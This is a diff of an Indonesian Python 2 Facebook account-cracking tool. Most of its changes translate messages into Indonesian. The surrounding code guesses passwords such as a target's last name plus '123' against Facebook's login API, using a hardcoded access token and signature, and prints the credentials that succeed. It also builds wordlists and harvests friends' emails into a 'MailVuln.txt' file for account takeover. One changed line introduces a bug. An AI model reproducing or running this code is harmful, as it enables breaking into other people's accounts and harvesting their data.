@@ -19,7 +19,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]
 
 
 def keluar():
@@ -675,7 +675,7 @@ def pilih_super():
                                 print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2 + ' ==> ' + b['name']
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2 + ' ==> ' + b['name']
+                                    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2 + ' ==> ' + ['name']
                                 else:
                                         pass3 = b['last_name'] + '123'
                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
@@ -776,9 +776,9 @@ def brute():
 
 
 def tanyaw():
-    why = raw_input('\x1b[1;91m[?] \x1b[1;92mAre you sure want to make wordlist ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
+    why = raw_input('\x1b[1;91m[?] \x1b[1;92mKamu ingin membuat  wordlist ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
     if why == '':
-        print '\x1b[1;91m[!] Please choice \x1b[1;97m(y/t)'
+        print '\x1b[1;91m[!] Mohon Pilih \x1b[1;97m(y/t)'
         tanyaw()
     else:
         if why == 'y':
@@ -793,7 +793,7 @@ def tanyaw():
                     if why == 'T':
                         menu_hack()
                     else:
-                        print '\x1b[1;91m[!] Please choice \x1b[1;97m(y/t)'
+                        print '\x1b[1;91m[!] Mohon Pilih \x1b[1;97m(y/t)'
                         tanyaw()
 
 
@@ -832,7 +832,7 @@ def yahoo_pilih():
                 if go == '0':
                     menu_hack()
                 else:
-                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mnot found'
+                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mTidak Ditemukan'
                     yahoo_pilih()
 
 
@@ -841,7 +841,7 @@ def yahoofriends():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token not found'
+        print '\x1b[1;91m[!] Token Tidak Ada'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -851,7 +851,7 @@ def yahoofriends():
     print 52 * '\x1b[1;97m\xe2\x95\x90'
     mpsh = []
     jml = 0
-    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
     friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
     kimak = json.loads(friends.text)
     save = open('MailVuln.txt', 'w')
@@ -1027,6 +1027,7 @@ def id_friends():
     except IOError:
         print '\x1b[1;91m[!] Token not found'
         os.system('rm -rf login.txt')
+
         time.sleep(1)
         login()
     else:
